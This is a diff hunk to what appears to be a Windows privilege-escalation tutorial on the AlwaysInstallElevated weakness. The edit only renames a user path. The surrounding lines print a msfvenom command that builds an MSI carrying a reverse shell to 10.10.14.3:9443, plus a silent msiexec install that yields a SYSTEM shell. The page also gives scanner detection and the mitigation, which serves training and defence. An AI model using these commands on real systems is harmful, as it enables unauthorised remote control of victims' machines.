@@ -75,7 +75,7 @@ With both set, build a malicious MSI and install it silently:
 msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
 ```
 ```cmd
-msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+msiexec /i c:\users\student\desktop\aie.msi /quiet /qn /norestart
 ```
 
 The reverse shell returns as `NT AUTHORITY\SYSTEM`. PowerUp and winPEAS both flag this automatically (see [weak permissions](/codex/windows/privesc/weak-permissions/#enumerate-the-weakness) for the scanner workflow). Mitigation is simply disabling both policy settings.
